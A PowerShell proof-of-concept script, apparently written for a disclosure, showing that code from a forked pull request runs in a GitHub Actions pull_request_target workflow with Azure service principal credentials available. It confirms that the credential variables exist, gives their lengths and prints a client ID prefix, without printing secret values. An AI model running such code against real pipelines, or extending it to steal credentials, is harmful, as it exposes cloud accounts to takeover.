# PoC: Demonstrate attacker-controlled script execution with access to secrets
# This script runs in the pull_request_target context with Azure credentials in env

Write-Output "=== PoC: Attacker-Controlled Script Execution ==="
Write-Output "Hostname: $(hostname)"
Write-Output "Whoami: $(whoami)"
Write-Output "PWD: $(Get-Location)"
Write-Output "GitHub Actor: $env:GITHUB_ACTOR"
Write-Output "GitHub Repository: $env:GITHUB_REPOSITORY"
Write-Output "GitHub Event: $env:GITHUB_EVENT_NAME"

# Prove environment variables are accessible (show length/existence, NOT values)
Write-Output "=== Environment Variable Access Check ==="
Write-Output "ARM_CLIENT_ID exists: $($null -ne $env:ARM_CLIENT_ID)"
Write-Output "ARM_CLIENT_ID length: $($env:ARM_CLIENT_ID.Length)"
Write-Output "ARM_TENANT_ID exists: $($null -ne $env:ARM_TENANT_ID)"
Write-Output "ARM_TENANT_ID length: $($env:ARM_TENANT_ID.Length)"
Write-Output "ARM_SUBSCRIPTION_ID exists: $($null -ne $env:ARM_SUBSCRIPTION_ID)"
Write-Output "ARM_SUBSCRIPTION_ID length: $($env:ARM_SUBSCRIPTION_ID.Length)"
Write-Output "ARM_CLIENT_SECRET exists: $($null -ne $env:ARM_CLIENT_SECRET)"
Write-Output "ARM_CLIENT_SECRET length: $($env:ARM_CLIENT_SECRET.Length)"

# Show first 4 chars of client ID as proof (non-sensitive identifier prefix)
if ($env:ARM_CLIENT_ID) {
    Write-Output "ARM_CLIENT_ID prefix: $($env:ARM_CLIENT_ID.Substring(0,4))****"
}

Write-Output "=== PoC Complete ==="
Write-Output "This proves arbitrary PowerShell execution from a forked PR"
Write-Output "with access to Azure Service Principal credentials."

# Exit successfully so subsequent steps also run (proving full chain)
exit 0
